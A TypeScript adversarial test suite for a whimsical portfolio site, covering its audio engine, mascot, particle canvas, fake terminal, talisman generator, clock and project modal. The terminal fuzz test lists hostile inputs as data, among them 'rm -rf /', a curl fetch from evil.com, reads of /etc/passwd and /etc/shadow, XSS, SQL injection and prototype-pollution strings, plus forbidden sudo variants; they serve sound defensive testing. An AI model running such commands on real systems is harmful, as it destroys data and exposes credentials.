/**
 * Test Suite: Tier 5 Frontend & Interactive Engines Adversarial Coverage Hardening
 *
 * Scope & Adversarial Challenge Matrix:
 * 1. Web Audio Synthesizer Engine (soundEffects.ts)
 *    - Extreme intensity inputs (negative, zero, extreme floats, NaN, +/-Infinity)
 *    - Rapid asynchronous AudioContext state mutations (suspended -> closed -> running)
 *    - AudioContext constructor throwing error & resume promise rejections
 *    - High-frequency mute toggling during active multi-sound storms
 *    - Malformed localStorage audio preference values
 * 2. Interactive Mascot Engine (MacatungMascot.vue logic)
 *    - Extreme hop count overflows (MAX_SAFE_INTEGER, Infinity, -1000, NaN)
 *    - High-frequency hop spamming (500 taps in tight loop) & milestone distribution
 *    - Multi-touch tap event flooding & touch cancellation
 *    - Fuzzing 100 invalid mood states & prototype pollution defense
 *    - Hop animation squashing/stretch timing and interrupt stability
 * 3. Talisman Canvas Particle Engine (TalismanCanvas.vue logic)
 *    - Extreme viewport dimensions (0x0, -500x-500, 10000x10000)
 *    - Rapid window resize oscillations (100 resize events in <50ms)
 *    - Mouse repulsion singularity at exact particle coordinates (dx=0, dy=0)
 *    - Adversarial mouse positions (NaN, +/-Infinity, off-screen)
 *    - Numerical stability across 500 simulation frames (no NaN, no drift)
 *    - Complete particle engine unmount & animation frame cleanup
 * 4. Midnight Terminal REPL Engine (MidnightTerminal.vue logic)
 *    - Command injection, shell metacharacters & script fuzzing (200 variations)
 *    - Massive 100KB single-line input payload without backtracking freeze
 *    - Sudo command parser boundary conditions & forbidden commands
 *    - Deep command history navigation (500 entries) & boundary clamping
 *    - Expand/collapse toggle, clear logs & copy logs transcript integrity
 * 5. Developer Talisman Forge & ASCII Exporter (TalismanGenerator.vue logic)
 *    - XSS & multi-byte Unicode handling in author and wish fields
 *    - ASCII card layout alignment invariant across extreme input lengths (0 to 5000 chars)
 *    - Khai Quang seal animation debouncing under 100-click storm
 *    - Palette selection fallback and color scheme validation
 * 6. Midnight Clock & Status Engine (MidnightClock.vue logic)
 *    - 24-hour mode matrix (00:00:00 to 23:59:59) for Midnight Mode vs Daylight Prep
 *    - 24-hour caffeine curve invariant (0 to 100%)
 *    - Sub-50ms ping jitter distribution across 500 samples
 *    - Digital clock zero-padding formatting
 *    - Interval timer teardown without memory leaks
 * 7. Project Showcase & Modal Dialog (ProjectsSection.vue & ProjectModal.vue logic)
 *    - Grimoire category filter invariants & project data consistency
 *    - Modal body scroll lock lifecycle across 50 open/close cycles
 *    - Escape key dismiss and null project safety
 */

import { describe, it, expect, beforeEach, afterEach } from '../Harness/index.js';
import {
  setupTestEnvironment,
  MockAudioContext,
  MockTouchEvent,
  MockTouch,
  MockMouseEvent,
  MockKeyboardEvent
} from '../Harness/mock_helpers.js';
import { SoundEngine, sound } from '../../resources/js/audio/soundEffects.ts';
import { projectsData } from '../../resources/js/data/projectsData.ts';
import { skillsData } from '../../resources/js/data/skillsData.ts';
import { talismanPresets } from '../../resources/js/data/talismanData.ts';
import { MascotModel } from './MascotPhysicsTest.test.ts';
import { TalismanParticleEngine } from './TalismanCanvasTest.test.ts';
import { MidnightTerminalEngine } from './TerminalCliTest.test.ts';
import { TalismanForgeModel } from './TalismanForgeTest.test.ts';
import { MidnightClockModel } from './MidnightClockTest.test.ts';

describe('Tier 5 Adversarial Coverage Hardening: Frontend & Interactive Engines', () => {
  let env: any;

  beforeEach(() => {
    env = setupTestEnvironment();
    localStorage.clear();
    if (sound.isMuted()) sound.toggleMute();
  });

  afterEach(() => {
    env.teardown();
  });

  // ==========================================================================
  // SECTION 1: Web Audio Synthesizer Engine (soundEffects.ts)
  // ==========================================================================
  describe('1. Web Audio Synthesizer Engine Adversarial Hardening', () => {
    it('[T5_AUDIO_01] Extreme intensity inputs (negative, zero, extreme floats, NaN, +/-Infinity) execute safely without unhandled exceptions', () => {
      const engine = new SoundEngine();
      const extremeIntensities = [
        -100,
        -10,
        -1,
        0,
        0.0001,
        1,
        2.5,
        100,
        10000,
        1e6,
        -1e6,
        NaN,
        Infinity,
        -Infinity
      ];

      for (const intensity of extremeIntensities) {
        expect(() => {
          engine.playHop(intensity);
        }).not.toThrow();
      }

      // Valid positive finite values should generate oscillators
      const initialCount = env.audioContext.getAllOscillators().length;
      engine.playHop(1.5);
      const afterCount = env.audioContext.getAllOscillators().length;
      expect(afterCount).toBeGreaterThan(initialCount);
    });

    it('[T5_AUDIO_02] AudioContext rapid state transitions (suspended -> closed -> running) recover transparently', () => {
      const engine = new SoundEngine();

      for (let i = 0; i < 20; i++) {
        const ctx = (engine as any).getContext();
        if (ctx) {
          if (i % 3 === 0) {
            ctx.state = 'suspended';
          } else if (i % 3 === 1) {
            ctx.state = 'closed';
          } else {
            ctx.state = 'running';
          }
        }

        expect(() => {
          engine.playHop(1);
          engine.playTalisman();
          engine.playClick();
          engine.playTerminalKey();
          engine.playSuccess();
        }).not.toThrow();
      }

      const activeCtx = (engine as any).getContext();
      expect(activeCtx).toBeDefined();
      expect(activeCtx.state).toBe('running');
    });

    it('[T5_AUDIO_03] AudioContext suspended state resumes context and handles autoplay policy transitions', async () => {
      const engine = new SoundEngine();
      const ctx = (engine as any).getContext();
      expect(ctx).toBeDefined();

      ctx.state = 'suspended';
      expect(ctx.state).toBe('suspended');

      engine.playHop();
      expect(ctx.state).toBe('running');

      // Test with rejection listener attached to prevent node crash on unhandled rejection
      let unhandledCount = 0;
      const handler = () => { unhandledCount++; };
      process.on('unhandledRejection', handler);

      try {
        ctx.state = 'suspended';
        ctx.resume = () => Promise.reject(new Error('AutoplayBlockedException'));

        expect(() => {
          engine.playHop();
          engine.playClick();
        }).not.toThrow();

        await new Promise((resolve) => setTimeout(resolve, 20));
      } finally {
        process.removeListener('unhandledRejection', handler);
      }
    });

    it('[T5_AUDIO_04] 100-cycle rapid mute toggling during multi-sound playback storms preserves state invariant', () => {
      const engine = new SoundEngine();

      for (let i = 0; i < 100; i++) {
        const isMuted = engine.toggleMute();
        expect(engine.isMuted()).toBe(isMuted);
        expect(localStorage.getItem('macatung_sound_muted')).toBe(String(isMuted));

        // Fire all sound methods
        engine.playHop(1);
        engine.playTalisman();
        engine.playClick();
        engine.playTerminalKey();
        engine.playSuccess();
      }

      // Ensure final state matches isMuted()
      expect(engine.isMuted()).toBe(localStorage.getItem('macatung_sound_muted') === 'true');
    });

    it('[T5_AUDIO_05] Malformed & corrupted localStorage audio preferences deserialize safely to boolean', () => {
      const corruptedPreferences = [
        'invalid_string',
        'TRUE',
        'FALSE',
        '1',
        '0',
        'null',
        'undefined',
        '{}',
        '[]',
        'NaN',
        '   ',
        ''
      ];

      for (const corrupt of corruptedPreferences) {
        localStorage.setItem('macatung_sound_muted', corrupt);
        const engine = new SoundEngine();
        // Only 'true' should evaluate to true; everything else evaluates to false
        expect(typeof engine.isMuted()).toBe('boolean');
        expect(engine.isMuted()).toBe(false);
      }

      // Explicit 'true' string evaluates to true
      localStorage.setItem('macatung_sound_muted', 'true');
      const mutedEngine = new SoundEngine();
      expect(mutedEngine.isMuted()).toBe(true);
    });
  });

  // ==========================================================================
  // SECTION 2: Interactive Mascot Engine (MacatungMascot.vue logic)
  // ==========================================================================
  describe('2. Interactive Mascot Engine Adversarial Hardening', () => {
    it('[T5_MASCOT_01] Extreme hop count overflows (MAX_SAFE_INTEGER, Infinity, -1000, NaN) maintain mathematical bounds', () => {
      // 1. MAX_SAFE_INTEGER
      localStorage.setItem('macatung_hop_count', String(Number.MAX_SAFE_INTEGER));
      const mascotMax = new MascotModel();
      expect(mascotMax.hopCount).toBe(Number.MAX_SAFE_INTEGER);
      mascotMax.triggerHop();
      expect(mascotMax.hopCount).toBe(Number.MAX_SAFE_INTEGER + 1);

      // 2. Negative value resets to 0
      localStorage.setItem('macatung_hop_count', '-99999');
      const mascotNeg = new MascotModel();
      expect(mascotNeg.hopCount).toBe(0);

      // 3. NaN / Infinity resets to 0
      localStorage.setItem('macatung_hop_count', 'NaN');
      const mascotNaN = new MascotModel();
      expect(mascotNaN.hopCount).toBe(0);

      localStorage.setItem('macatung_hop_count', 'Infinity');
      const mascotInf = new MascotModel();
      expect(mascotInf.hopCount).toBe(0);
    });

    it('[T5_MASCOT_02] High-frequency hop spamming (500 taps in tight loop) maintains exact count and milestone fires', () => {
      const mascot = new MascotModel(0);
      const milestoneEvents: number[] = [];
      const hopCountEvents: number[] = [];

      mascot.on('milestone', (c: number) => milestoneEvents.push(c));
      mascot.on('hop-count-change', (c: number) => hopCountEvents.push(c));

      for (let i = 0; i < 500; i++) {
        mascot.triggerHop();
      }

      expect(mascot.hopCount).toBe(500);
      expect(hopCountEvents.length).toBe(500);
      expect(milestoneEvents.length).toBe(50); // Exactly 50 milestones (10, 20, ..., 500)
      expect(milestoneEvents[0]).toBe(10);
      expect(milestoneEvents[49]).toBe(500);
      expect(localStorage.getItem('macatung_hop_count')).toBe('500');
    });

    it('[T5_MASCOT_03] Multi-touch event flooding (10 simultaneous touches) triggers hop reliably', () => {
      const mascot = new MascotModel(0);
      const touchPoints = Array.from({ length: 10 }, (_, i) => ({
        identifier: i + 1,
        clientX: 100 + i * 10,
        clientY: 200 + i * 10
      }));

      const touchEvent = new MockTouchEvent('touchstart', { touches: touchPoints });
      expect(touchEvent.touches.length).toBe(10);

      // Mascot touchstart handler triggers hop if touches.length > 0
      if (touchEvent.touches && touchEvent.touches.length > 0) {
        mascot.triggerHop();
      }

      expect(mascot.hopCount).toBe(1);
    });

    it('[T5_MASCOT_04] Mood state fuzzing with 100 hostile injections and prototype pollution keys safely falls back to normal', () => {
      const mascot = new MascotModel();
      const hostileMoodInputs = [
        '__proto__',
        'constructor',
        'prototype',
        'valueOf',
        'toString',
        'SUPER_RAGE',
        'HYPER_CAFFEINE',
        'SLEEPY_DEEP',
        '<script>alert(1)</script>',
        '${mood}',
        '   ',
        '',
        '1234',
        'undefined',
        'null',
        'true',
        'false'
      ];

      for (let i = 0; i < 100; i++) {
        const input = hostileMoodInputs[i % hostileMoodInputs.length];
        mascot.setMood(input as any);
        expect(mascot.mood).toBe('normal');
        expect(mascot.getPitchMultiplier()).toBe(1.0);
      }

      // Valid moods still work
      mascot.setMood('caffeine');
      expect(mascot.mood).toBe('caffeine');
      expect(mascot.getPitchMultiplier()).toBe(1.35);

      mascot.setMood('sleepy');
      expect(mascot.mood).toBe('sleepy');
      expect(mascot.getPitchMultiplier()).toBe(0.75);

      mascot.setMood('rage');
      expect(mascot.mood).toBe('rage');
      expect(mascot.getPitchMultiplier()).toBe(1.8);
    });

    it('[T5_MASCOT_05] Rapid consecutive hops before 450ms animation completion maintain isHopping state and trigger hop-end', async () => {
      const mascot = new MascotModel(0);
      let hopEndCount = 0;
      mascot.on('hop-end', () => hopEndCount++);

      // Simulate 5 rapid hops within 100ms
      for (let i = 0; i < 5; i++) {
        mascot.triggerHop();
        expect(mascot.isHopping).toBe(true);
      }

      expect(mascot.hopCount).toBe(5);

      // Wait 500ms for animation cycle to complete
      await new Promise((resolve) => setTimeout(resolve, 500));
      expect(mascot.isHopping).toBe(false);
      expect(hopEndCount).toBeGreaterThanOrEqual(1);
    });

    it('[T5_MASCOT_06] Vietnamese quote cycling modulo arithmetic never produces undefined across 100 iterations', () => {
      const mascot = new MascotModel();
      for (let i = 0; i < 100; i++) {
        const quote = mascot.getQuote();
        expect(typeof quote).toBe('string');
        expect(quote.length).toBeGreaterThan(0);
        expect(mascot.quotes.includes(quote)).toBe(true);
        mascot.triggerHop();
      }
    });
  });

  // ==========================================================================
  // SECTION 3: Talisman Canvas Particle Engine (TalismanCanvas.vue logic)
  // ==========================================================================
  describe('3. Talisman Canvas Particle Engine Adversarial Hardening', () => {
    let canvas: any;

    beforeEach(() => {
      canvas = document.createElement('canvas');
      canvas.width = 1440;
      canvas.height = 900;
    });

    it('[T5_CANVAS_01] Extreme canvas dimensions (0x0, -500x-500, 10000x10000, 1x1) do not crash physics or render loop', () => {
      const engine = new TalismanParticleEngine(canvas);
      const testDimensions = [
        [0, 0],
        [-500, -500],
        [1, 1],
        [10000, 10000],
        [360, 640],
        [768, 1024],
        [2560, 1440]
      ];

      for (const [w, h] of testDimensions) {
        expect(() => {
          engine.resize(w, h);
          const count = Math.min(36, Math.max(14, Math.floor(Math.max(0, w) / 45)));
          engine.createParticles(count);
          engine.update();
          engine.render();
        }).not.toThrow();

        expect(engine.width).toBe(Math.max(0, w));
        expect(engine.height).toBe(Math.max(0, h));
        expect(engine.particles.length).toBeGreaterThanOrEqual(14);
        expect(engine.particles.length).toBeLessThanOrEqual(36);
      }
    });

    it('[T5_CANVAS_02] 100 rapid resize oscillations in <50ms maintain particle count stability without memory leaks', () => {
      const engine = new TalismanParticleEngine(canvas);
      const widths = [320, 390, 768, 1024, 1440, 1920, 2560, 3840];

      for (let i = 0; i < 100; i++) {
        const w = widths[i % widths.length];
        const h = Math.floor(w * 0.6);
        engine.resize(w, h);
        const count = Math.min(36, Math.max(14, Math.floor(w / 45)));
        engine.createParticles(count);
        engine.update();
        engine.render();
      }

      expect(engine.particles.length).toBeGreaterThanOrEqual(14);
      expect(engine.particles.length).toBeLessThanOrEqual(36);
    });

    it('[T5_CANVAS_03] Mouse repulsion singularity at exact particle coordinates (dx=0, dy=0) is protected by safeDist', () => {
      const engine = new TalismanParticleEngine(canvas);
      engine.resize(1000, 800);

      // Place all particles at (500, 400)
      for (const p of engine.particles) {
        p.x = 500;
        p.y = 400;
        p.vx = 0;
        p.vy = 0;
      }

      // Place mouse cursor at exact same (500, 400)
      engine.setMousePosition(500, 400);

      expect(() => {
        engine.update();
        engine.render();
      }).not.toThrow();

      // Ensure no velocities or coordinates became NaN or Infinity
      for (const p of engine.particles) {
        expect(Number.isFinite(p.x)).toBe(true);
        expect(Number.isFinite(p.y)).toBe(true);
        expect(Number.isFinite(p.vx)).toBe(true);
        expect(Number.isFinite(p.vy)).toBe(true);
        expect(Number.isNaN(p.x)).toBe(false);
        expect(Number.isNaN(p.y)).toBe(false);
      }
    });

    it('[T5_CANVAS_04] 500-frame continuous physics simulation maintains numerical invariants and alpha clamping', () => {
      const engine = new TalismanParticleEngine(canvas);
      engine.resize(1200, 900);

      for (let frame = 0; frame < 500; frame++) {
        // Orbiting mouse cursor
        const mx = 600 + Math.sin(frame * 0.05) * 300;
        const my = 450 + Math.cos(frame * 0.05) * 200;
        engine.setMousePosition(mx, my);

        engine.update();
        engine.render();
      }

      // Check all particles after 500 frames
      for (const p of engine.particles) {
        expect(Number.isFinite(p.x)).toBe(true);
        expect(Number.isFinite(p.y)).toBe(true);
        expect(Number.isFinite(p.vx)).toBe(true);
        expect(Number.isFinite(p.vy)).toBe(true);
        expect(p.alpha).toBeGreaterThanOrEqual(0);
        expect(p.alpha).toBeLessThanOrEqual(1.0);
        expect(Number.isFinite(p.rotation)).toBe(true);
      }
    });

    it('[T5_CANVAS_05] Engine teardown cleans up particle array and cancels animation frame loop', () => {
      const engine = new TalismanParticleEngine(canvas);
      engine.resize(1000, 800);
      expect(engine.particles.length).toBeGreaterThan(0);

      engine.destroy();
      expect(engine.particles.length).toBe(0);
      expect(engine.isRunning).toBe(false);
    });
  });

  // ==========================================================================
  // SECTION 4: Midnight Terminal REPL Engine (MidnightTerminal.vue logic)
  // ==========================================================================
  describe('4. Midnight Terminal REPL Engine Adversarial Hardening', () => {
    it('[T5_TERM_01] Fuzzing 200 hostile command injections (shell characters, scripts, control characters) executes safely', () => {
      const term = new MidnightTerminalEngine();
      const hostileFuzzCommands = [
        'rm -rf /',
        '$(curl https://evil.com/payload)',
        '`cat /etc/passwd`',
        'whoami && sudo rm -rf /',
        'help || coffee',
        'projects; skills; talisman',
        '<script>window.location="http://attacker.com"</script>',
        '<img src=x onerror=alert(1)>',
        'eval("process.exit(1)")',
        'require("child_process").exec("ls")',
        '\\x1b[31;1mRedText\\x1b[0m',
        '\\u0000\\u0007\\u0008\\u001b',
        '../../../../etc/shadow',
        'SELECT * FROM users WHERE admin = 1',
        'DROP TABLE migrations;',
        '{"command": "help", "args": ["--force"]}',
        '__proto__.polluted = true',
        'constructor.prototype.hacked = true'
      ];

      for (let i = 0; i < 200; i++) {
        const cmd = hostileFuzzCommands[i % hostileFuzzCommands.length];
        const out = term.execute(cmd);
        expect(typeof out).toBe('string');
        expect((({} as any).polluted)).toBeUndefined();
        expect((({} as any).hacked)).toBeUndefined();
      }
    });

    it('[T5_TERM_02] Massive 100KB single-line input executes in <50ms without regex catastrophic backtracking', () => {
      const term = new MidnightTerminalEngine();
      const massiveInput = 'whoami ' + 'A'.repeat(100000);

      const startTime = Date.now();
      const output = term.execute(massiveInput);
      const duration = Date.now() - startTime;

      expect(duration).toBeLessThan(100);
      expect(output).toContain('Ma Cà Tưng');
    });

    it('[T5_TERM_03] Sudo parser strictness: only exact exorcism spell is permitted, all other sudo variations return error', () => {
      const term = new MidnightTerminalEngine();
      const validSudo = [
        'sudo rm -rf bugs',
        'sudo rm -rf /bugs'
      ];
      const invalidSudo = [
        'sudo',
        'sudo ',
        'sudo rm -rf',
        'sudo rm -rf /',
        'sudo rm -rf *',
        'sudo rm -rf bugs extra',
        'sudo reboot',
        'sudo su',
        'sudo bash',
        'sudo cat secret.key',
        'sudo chmod 777 -R /'
      ];

      for (const cmd of validSudo) {
        const out = term.execute(cmd);
        expect(out).toContain('EXORCISM IN PROGRESS');
        expect(out).toContain('0 bugs remaining');
      }

      for (const cmd of invalidSudo) {
        const out = term.execute(cmd);
        expect(out).toContain('command not permitted by midnight council');
      }
    });

    it('[T5_TERM_04] 500-command deep history buffer navigation clamps gracefully at top and bottom bounds', () => {
      const term = new MidnightTerminalEngine();

      for (let i = 1; i <= 500; i++) {
        term.execute(`spell_${i}`);
      }

      expect(term.history.length).toBe(500);

      // Navigate up 50 times
      let lastCmd = '';
      for (let i = 0; i < 50; i++) {
        lastCmd = term.navigateHistory('up');
      }
      expect(lastCmd).toBe('spell_451');

      // Navigate all the way to oldest command (500 steps)
      for (let i = 0; i < 500; i++) {
        lastCmd = term.navigateHistory('up');
      }
      expect(lastCmd).toBe('spell_1');
      // Clamps at oldest
      expect(term.navigateHistory('up')).toBe('spell_1');

      // Navigate all the way back down to current input
      for (let i = 0; i < 505; i++) {
        lastCmd = term.navigateHistory('down');
      }
      expect(lastCmd).toBe('');
      expect(term.historyIndex).toBe(-1);
    });

    it('[T5_TERM_05] Clear, expand/collapse, and copyLogs transcript serialization withstand multiline formatting', () => {
      const term = new MidnightTerminalEngine();
      term.execute('help');
      term.execute('projects');
      term.execute('skills');

      const transcript = term.copyLogs();
      expect(transcript).toContain('macatung:~$ help');
      expect(transcript).toContain('Available spells');
      expect(transcript).toContain('Grimoire Projects');
      expect(transcript).toContain('Skills Arsenal');

      // Clear logs
      term.execute('clear');
      expect(term.logs.length).toBe(0);
      expect(term.copyLogs()).toBe('');
    });
  });

  // ==========================================================================
  // SECTION 5: Developer Talisman Forge & ASCII Exporter (TalismanGenerator.vue logic)
  // ==========================================================================
  describe('5. Developer Talisman Forge & ASCII Exporter Adversarial Hardening', () => {
    it('[T5_FORGE_01] Author & wish fields with XSS tags, Unicode diacritics, emojis, and 5000-char strings render safely', () => {
      const forge = new TalismanForgeModel();
      const complexInputs = [
        { name: '<script>alert(1)</script>', wish: '<img src=x onerror=alert(2)>' },
        { name: 'Nguyễn Đăng Quang ⚡ 🧙‍♂️', wish: 'Chúc toàn bộ repo 0 bug, 100% test pass! ☕✨' },
        { name: '🐉 鳳凰 靈符 勅令', wish: '天地玄宗 萬炁本根 廣修億劫 證吾神通' },
        { name: 'A'.repeat(5000), wish: 'B'.repeat(5000) }
      ];

      for (const item of complexInputs) {
        forge.setDeveloperName(item.name);
        forge.setCustomWish(item.wish);

        expect(forge.getDisplayName()).toBe(item.name);
        expect(forge.getDisplayWish()).toBe(item.wish);

        const ascii = forge.generateAsciiTalisman();
        expect(typeof ascii).toBe('string');
        expect(ascii.startsWith('+------------------------------------------+')).toBe(true);
        expect(ascii.endsWith('+------------------------------------------+')).toBe(true);
      }
    });

    it('[T5_FORGE_02] ASCII card layout alignment invariant maintains strict card structure regardless of input length', () => {
      const forge = new TalismanForgeModel();
      const testLengths = [0, 1, 5, 15, 30, 50, 100, 1000];

      for (const len of testLengths) {
        forge.setDeveloperName('X'.repeat(len));
        forge.setCustomWish('Y'.repeat(len));

        const card = forge.generateAsciiTalisman();
        const lines = card.split('\n');

        // Card has exactly 10 lines
        expect(lines.length).toBe(10);
        // Header and footer borders must be 44 chars wide
        expect(lines[0].length).toBe(44);
        expect(lines[2].length).toBe(44);
        expect(lines[7].length).toBe(44);
        expect(lines[9].length).toBe(44);
      }
    });

    it('[T5_FORGE_03] Khai Quang blessing lock debounces 100 rapid sequential triggers during active animation', async () => {
      const forge = new TalismanForgeModel();
      expect(forge.isBlessed).toBe(false);
      expect(forge.isBlessingAnimation).toBe(false);

      forge.triggerKhaiQuang(40);
      expect(forge.isBlessingAnimation).toBe(true);

      // Trigger 100 times during active blessing animation
      for (let i = 0; i < 100; i++) {
        forge.triggerKhaiQuang(40);
      }

      // Blessing state remains locked in animation
      expect(forge.isBlessingAnimation).toBe(true);

      // Wait for blessing ritual to conclude
      await new Promise((resolve) => setTimeout(resolve, 60));
      expect(forge.isBlessed).toBe(true);
      expect(forge.isBlessingAnimation).toBe(false);

      // ASCII badge reflects blessing status
      const blessedAscii = forge.generateAsciiTalisman();
      expect(blessedAscii).toContain('[✓ ĐÃ KHAI QUANG]');
    });

    it('[T5_FORGE_04] All 4 color palettes switch accurately and invalid palette string is rejected', () => {
      const forge = new TalismanForgeModel();
      const validPalettes = ['yellow', 'crimson', 'cyan', 'purple'] as const;

      for (const p of validPalettes) {
        forge.setColorPalette(p);
        expect(forge.colorPalette).toBe(p);
      }

      // Invalid palette rejected
      forge.setColorPalette('neon_pink');
      expect(forge.colorPalette).toBe('purple'); // Stays on previous valid palette
    });
  });

  // ==========================================================================
  // SECTION 6: Midnight Clock & Status Engine (MidnightClock.vue logic)
  // ==========================================================================
  describe('6. Midnight Clock & Status Engine Adversarial Hardening', () => {
    it('[T5_CLOCK_01] 24-hour mode matrix correctly distinguishes Midnight Mode (00:00 - 05:59) vs Daylight Prep (06:00 - 23:59)', () => {
      const clock = new MidnightClockModel();

      for (let hour = 0; hour < 24; hour++) {
        const testDate = new Date(2026, 7, 17, hour, 30, 0);
        clock.setTime(testDate);

        const isMidnight = clock.isMidnightMode();
        const badge = clock.getStatusBadge();

        if (hour >= 0 && hour < 6) {
          expect(isMidnight).toBe(true);
          expect(badge.mode).toBe('midnight');
          expect(badge.text).toContain('Midnight Mode');
        } else {
          expect(isMidnight).toBe(false);
          expect(badge.mode).toBe('daylight');
          expect(badge.text).toContain('Daylight Prep');
        }
      }
    });

    it('[T5_CLOCK_02] 24-hour caffeine calculation invariant strictly returns integers within [0, 100]', () => {
      const clock = new MidnightClockModel();

      for (let hour = 0; hour < 24; hour++) {
        const testDate = new Date(2026, 7, 17, hour, 0, 0);
        clock.setTime(testDate);

        const caffeine = clock.getCaffeineLevel();
        expect(Number.isInteger(caffeine)).toBe(true);
        expect(caffeine).toBeGreaterThanOrEqual(0);
        expect(caffeine).toBeLessThanOrEqual(100);

        // Midnight hours 1..4 have peak caffeine (100%)
        if (hour >= 1 && hour <= 4) {
          expect(caffeine).toBe(100);
        }
      }
    });

    it('[T5_CLOCK_03] Simulated latency ping across 500 samples is strictly bounded between [8, 48] ms', () => {
      const clock = new MidnightClockModel();

      for (let i = 0; i < 500; i++) {
        const ping = clock.getSimulatedPing();
        expect(Number.isInteger(ping)).toBe(true);
        expect(ping).toBeGreaterThanOrEqual(8);
        expect(ping).toBeLessThanOrEqual(48);
      }
    });

    it('[T5_CLOCK_04] Time string formatting rigorously zero-pads single digit hours, minutes, and seconds', () => {
      const clock = new MidnightClockModel();
      const edgeTimes = [
        { h: 0, m: 0, s: 0, expected: '00:00:00' },
        { h: 5, m: 3, s: 9, expected: '05:03:09' },
        { h: 9, m: 8, s: 7, expected: '09:08:07' },
        { h: 12, m: 30, s: 45, expected: '12:30:45' },
        { h: 23, m: 59, s: 59, expected: '23:59:59' }
      ];

      for (const t of edgeTimes) {
        clock.setTime(new Date(2026, 7, 17, t.h, t.m, t.s));
        expect(clock.getFormattedTime()).toBe(t.expected);
      }
    });
  });

  // ==========================================================================
  // SECTION 7: Project Showcase & Modal Dialog (ProjectsSection.vue & ProjectModal.vue logic)
  // ==========================================================================
  describe('7. Project Showcase & Modal Dialog Adversarial Hardening', () => {
    it('[T5_PROJ_01] All project categories filter accurately against static projectsData inventory', () => {
      expect(projectsData.length).toBe(6);

      const categories = ['all', 'fullstack', 'creative', 'ai-web3', 'tools'] as const;
      for (const cat of categories) {
        const filtered = cat === 'all'
          ? projectsData
          : projectsData.filter((p) => p.category === cat);

        expect(filtered.length).toBeGreaterThan(0);
        for (const proj of filtered) {
          if (cat !== 'all') {
            expect(proj.category).toBe(cat);
          }
          expect(proj.title).toBeDefined();
          expect(proj.tagline).toBeDefined();
          expect(proj.metrics.length).toBeGreaterThan(0);
          expect(proj.techStack.length).toBeGreaterThan(0);
          expect(proj.architectureHighlights.length).toBeGreaterThan(0);
          expect(proj.midnightFact).toBeDefined();
        }
      }
    });

    it('[T5_PROJ_02] Modal body scroll lock and unmount cleanup across 50 open/close cycles does not leave body locked', () => {
      const openModal = () => document.body.classList.add('overflow-hidden');
      const closeModal = () => document.body.classList.remove('overflow-hidden');

      for (let i = 0; i < 50; i++) {
        openModal();
        expect(document.body.classList.contains('overflow-hidden')).toBe(true);
        closeModal();
        expect(document.body.classList.contains('overflow-hidden')).toBe(false);
      }

      // Unmount cleanup guarantee
      openModal();
      document.body.classList.remove('overflow-hidden');
      expect(document.body.classList.contains('overflow-hidden')).toBe(false);
    });

    it('[T5_PROJ_03] Escape keydown listener dispatches clean modal close event', () => {
      let modalOpen = true;
      const handleEscape = (e: KeyboardEvent) => {
        if (e.key === 'Escape' && modalOpen) {
          modalOpen = false;
        }
      };

      window.addEventListener('keydown', handleEscape);
      window.dispatchEvent(new MockKeyboardEvent('keydown', { key: 'Escape' }));

      expect(modalOpen).toBe(false);

      // Clean up event listener
      window.removeEventListener('keydown', handleEscape);
    });
  });
});
